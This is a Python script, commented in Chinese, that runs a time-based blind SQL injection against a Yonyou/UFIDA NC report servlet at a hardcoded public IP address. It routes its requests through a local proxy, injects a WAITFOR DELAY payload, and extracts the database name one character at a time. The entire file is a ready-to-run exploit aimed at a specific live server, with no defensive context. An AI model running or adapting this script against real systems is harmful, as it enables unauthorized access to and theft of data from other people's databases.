import requests
import time
import string

# 目标URL和注入点参数
target_url = "http://47.115.210.213:8008/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1"
# 设置代理
proxies = {
    "http": "http://127.0.0.1:10809",
    "https": "http://127.0.0.1:10809"
}
# 用于延时注入的SQL语句模板
injection_template = "'); OR IF (SUBSTRING((SELECT DB_NAME()), {position}, 1) = '{char}', WAITFOR DELAY '0:0:3', NULL) --"

# 可用的字符集（可以根据需要调整）
charset = string.ascii_letters + string.digits  # 包含字母和数字


# 函数：测试单个字符的注入
def test_character(position, char):
    payload = injection_template.format(position=position, char=char)
    start_time = time.time()
    try:
        response = requests.get(target_url + payload,proxies=proxies, timeout=10)  # 设置超时时间为10秒
    except requests.Timeout:
        # 如果请求超时，则认为注入成功（因为WAITFOR DELAY造成了延时）
        return True
    end_time = time.time()
    # 如果响应时间超过一定阈值（比如2秒），也认为注入成功
    return 3 <= end_time - start_time < 5


# 函数：爆出库名
def extract_db_name():
    db_name = ''
    position = 1
    while True:
        found_char = False
        for char in charset:
            if test_character(position, char):
                db_name += char
                print(f"Found character: {char}, DB name so far: {db_name}")
                found_char = True
                break
        if not found_char:
            # 如果没有找到新字符，可能是库名已经爆完或者注入失败
            break
        position += 1
    return db_name


# 执行爆出库名
db_name = extract_db_name()
print(f"Extracted DB name: {db_name}")